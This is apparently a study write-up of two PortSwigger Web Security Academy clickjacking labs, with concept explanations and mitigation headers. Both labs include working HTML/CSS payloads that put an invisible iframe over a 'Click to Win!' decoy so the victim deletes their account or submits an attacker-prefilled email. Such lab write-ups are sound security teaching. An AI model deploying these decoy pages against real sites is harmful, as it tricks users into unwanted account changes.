#  Lab: Basic clickjacking with CSRF token protection
**Platform:** PortSwigger Web Security Academy
**Goal:** Trick the victim into clicking a hidden "Delete account" button by overlaying an invisible iframe on top of a decoy button.
**Vulnerability:** UI Redressing (Clickjacking). The target application does not prevent its pages from being framed by other domains (Missing `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers).

##  The Concept (Why CSRF Tokens Don't Stop Clickjacking)
CSRF attacks rely on the attacker forging a cross-site request. Modern apps use CSRF tokens to block this. However, **Clickjacking bypasses CSRF tokens completely.** Why? Because in Clickjacking, the attacker doesn't forge the request. The attacker simply loads the legitimate application inside an invisible `<iframe>`. The victim, interacting with the invisible iframe within their own authenticated browser session, naturally clicks the *real* button. The browser then submits the *real* form, including the *real* CSRF token. The server sees a perfectly valid, authenticated request and executes it.

##  Step-by-Step Exploitation

### Step 1: Craft the Decoy Page
1. Go to the Exploit Server.
2. Create an HTML page containing a highly visible, enticing decoy button (e.g., "Click to win!").
3. Embed the target application's sensitive page (e.g., `/my-account`) using an `<iframe>`.

### Step 2: The CSS Magic (Alignment & Invisibility)
1. Use CSS `position: absolute` and `z-index` to place the `<iframe>` strictly *on top* of the decoy button.
2. Initially, set the iframe's `opacity: 0.5` (semi-transparent) so you can visually align the target button (e.g., "Delete account") exactly over your decoy button.
3. Adjust the `top` and `left` CSS properties of your decoy button until the alignment is pixel-perfect.
4. Once aligned, change the iframe's `opacity: 0.0001` (virtually invisible).

**Payload Structure:**
```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 500px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2; /* On top */
    }
    .decoy {
        position: absolute;
        top: 380px; /* Adjusted for alignment */
        left: 20px; /* Adjusted for alignment */
        z-index: 1; /* Underneath */
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy">Click me to Win!</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>
```
### Step 3: Execute the Takedown
1. Store the payload on the Exploit Server.

2. Deliver the exploit to the victim. The victim clicks the "Win!" button, inadvertently clicking the hidden "Delete account" button, solving the lab.

**Key Takeaway / Mitigation:** To prevent Clickjacking, servers must instruct browsers NOT to frame their pages. This is done using HTTP headers:

* X-Frame-Options: DENY (or SAMEORIGIN) - Legacy but widely supported.

* Content-Security-Policy: frame-ancestors 'none' (or 'self') - Modern, robust standard.

# 2nd Lab

# 🛡️ Lab: Clickjacking with form input data prefilled from a URL parameter
**Platform:** PortSwigger Web Security Academy
**Goal:** Change the victim's email address by tricking them into clicking the "Update email" button via UI redressing.
**Vulnerability:** Clickjacking combined with URL-based form data prefilling.

## 🧠 The Concept (The Autofill Exploit)
Clickjacking relies on intercepting clicks, not keystrokes. An attacker cannot force a victim to type malicious data into a hidden iframe. However, if the target application allows form inputs to be prefilled via URL parameters (e.g., `GET /profile?email=attacker@evil.com`), the attacker bypasses the typing restriction entirely. 
The attacker frames the target page using the manipulated URL. The victim's browser loads the invisible iframe with the attacker's payload already inserted into the input field. The attacker then uses standard UI redressing to trick the victim into clicking the form's "Submit/Update" button, successfully executing the state-changing action with attacker-controlled data.

## 🛠️ Step-by-Step Exploitation

### Step 1: Verify the Prefill Feature
Test the target endpoint by appending a parameter to the URL: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@test.com`. If the input field populates with the provided value, it is vulnerable.

### Step 2: Craft the Exploit Payload
Construct an HTML payload on the Exploit Server with a decoy button and the invisible iframe.
**Crucial:** The `src` attribute of the iframe MUST contain the prefill parameter.

```html
<style>
    iframe {
        position: absolute;
        width: 700px;
        height: 500px;
        top: 0;
        left: 0;
        opacity: 0.0001; /* Invisible cloak */
        z-index: 2;
    }
    .decoy-button {
        position: absolute;
        top: 450px; /* Adjust for perfect alignment */
        left: 80px; /* Adjust for perfect alignment */
        z-index: 1;
        padding: 10px;
        background: red;
        color: white;
    }
</style>
<div class="decoy-button">Click to Win!</div>
<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
```
### Step 3: Align and Deliver
1. Temporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's "Update email" button.

2. Once aligned, restore opacity: 0.0001.

3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Update" button, which submits the prefilled attacker email. Lab Solved! 🎉

**Key Takeaway / Mitigation**: Allowing state-changing form fields to be prefilled directly from URL parameters significantly increases the attack surface for CSRF and Clickjacking. Applications should rely on secure session state or explicit user input, and always deploy robust Anti-Clickjacking headers (Content-Security-Policy: frame-ancestors).